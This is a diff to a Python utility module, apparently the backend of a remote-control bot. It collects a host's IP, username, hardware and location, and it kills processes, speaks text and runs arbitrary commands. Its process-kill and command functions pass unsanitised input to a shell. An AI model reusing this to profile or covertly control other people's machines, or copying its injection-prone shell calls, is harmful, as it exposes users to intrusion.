@@ -35,17 +35,14 @@ def GetIP():
     return(IP)
 
 def GetUsername():
-    import socket
-    name = socket.gethostname()
-    return(name)
+    import socket, os
+    name1 = os.environ.get('USERNAME')
+    name2 = socket.gethostname()
+    return(name1 + " (" + name2 + ")")
 
 def GetOS():
     import platform
     return(platform.system() + " " + platform.release())
-
-def KeyboardShortcut(text):
-    import keyboard
-    keyboard.press_and_release(text)
 
 def GetHardware():
     import wmi
@@ -55,7 +52,8 @@ def GetHardware():
     gpu_info = computer.Win32_VideoController()[0].Name
     ram_info = float(os_info.TotalVisibleMemorySize) / 1048576
     ram = str(round(float('{0}'.format(ram_info)))) + " GB"
-    return(cpu_info, gpu_info, ram)
+    mb = str(GetHardwareMotherboard())
+    return(cpu_info, gpu_info, ram, mb)
 
 def GetHardwareCPU():
     import wmi
@@ -77,7 +75,7 @@ def GetHardwareRAM():
     ram = str(round(float('{0}'.format(ram_info)))) + " GB"
     return(ram)
 
-def GetMotherboard():
+def GetHardwareMotherboard():
     import win32com
     motherboard_details = []
     strComputer = "."
@@ -154,10 +152,10 @@ def Clear():
 def KillProcess(name):
     import subprocess
     try:
-        command = "TASKKILL /IM " + name + " /F"
+        command = "TASKKILL /IM {}".format(name) + " /F"
         subprocess.check_call(command, shell=True)
     except:
-        return("Can't kill '" + name + "' process")
+        return("Can't kill '{}".format(name) + "' process")
     else:
         pass
 
@@ -169,7 +167,7 @@ def StartSteamGame(id):
         id = 730
     if(str(id) == "GTAV"):
         id = 271590
-    subprocess.call("start steam://run/" + str(id), shell=True)
+    subprocess.call("start steam://run/{}".format(str(id)), shell=True)
 
 def Start(name):
     import os
@@ -188,8 +186,6 @@ def Speech(text):
     from pygame import mixer
     from gtts import gTTS
     warnings.filterwarnings("ignore")
-    if(text == "Def"):
-        text= "я @ ты @ я @ ты @ я @ ты @ я @ ты @ я @ ты @ я @ ты @ я @ ты @ я @ ты @ я @ ты @"
     tts = gTTS(text=text, lang='ru')
     tts.save("music.mp3")
     mixer.init()
@@ -226,10 +222,13 @@ def Location():
             loc = loc + ". {}".format(data[attr])
     return(loc)
 
-def SetImageAsDesktop(image):
+def SetImageOnDesktop(image):
     import ctypes
     SPI_SETDESKWALLPAPER = 20
-    im = str(Dir()) + "/" + image
+    if(image[2] != "/"):
+        im = str(Dir()) + "/" + image
+    else:
+        im = image
     ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, im, 0)
 
 def DownloadVideo(link):
@@ -243,7 +242,7 @@ def DownloadVideo(link):
     stream.download()
     print("Downloaded")
 
-def GetCommand(command):
+def DoCommand(command):
     import subprocess
     subprocess.call(command, shell=True)
 
